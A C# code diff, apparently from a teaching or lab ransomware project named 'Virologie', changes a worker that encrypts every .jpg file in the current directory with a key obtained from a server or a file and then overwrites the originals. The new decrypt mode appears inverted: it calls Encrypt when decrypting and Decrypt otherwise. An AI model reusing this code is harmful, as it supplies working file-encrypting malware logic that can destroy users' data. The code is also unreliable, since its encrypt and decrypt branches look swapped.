@@ -15,6 +15,7 @@ namespace Virologie
 
     class EncryptWorker : BackgroundWorker
     {
+        private readonly bool _decrypt;
         public EncryptError ErrorType { get; private set; }
 
         private string _fileBuf1 = "";
@@ -24,12 +25,9 @@ namespace Virologie
         {
             get
             {
-                if (_switchFiles)
-                    return _fileBuf1;
-                else
-                    return _fileBuf2;
+                return _switchFiles ? _fileBuf1 : _fileBuf2;
             }
-            set
+            private set
             {
                 if (_switchFiles)
                     _fileBuf2 = value;
@@ -43,26 +41,38 @@ namespace Virologie
             _switchFiles = !_switchFiles;
         }
 
-        public EncryptWorker()
+        public EncryptWorker(bool decrypt = false)
         {
+            _decrypt = decrypt;
             DoWork += worker_DoWork;
             WorkerReportsProgress = true;
         }
 
         void worker_DoWork(object sender, DoWorkEventArgs args)
         {
-            FileExplorer explorer = new FileExplorer();
-            FileEncrypter encrypter = CryptoKeyManager.CreateFromServer("http://localhost:1234/");
+            var explorer = new FileExplorer();
+            FileEncrypter encrypter;
+            encrypter = _decrypt 
+                ? CryptoKeyManager.CreateFromServer("http://localhost:1234/") 
+                : CryptoKeyManager.CreateFromFile(CryptoKeyManager.guid.ToString());
+
             if (encrypter != null)
             {
                 var files = explorer.EnumerateFiles(Directory.GetCurrentDirectory(), "*.jpg");
-                int count = 0;
-                foreach (var file in files)
+                int count = 1;
+                var enumerable = files as IList<string> ?? files.ToList();
+                foreach (var file in enumerable)
                 {
-                    ReportProgress(100 * count / (100 * files.Count()));
+                    ReportProgress(100 * count++ / (100 * enumerable.Count()));
                     CurrentFile = file;
                     SwitchFiles();
-                    encrypter.Encrypt(file);
+
+                    if (_decrypt)
+                        encrypter.Encrypt(file);
+                    else
+                        encrypter.Decrypt(file);
+
+                    explorer.ReplaceFile(file);
                 }
                 CryptoKeyManager.SaveGUID();
             }
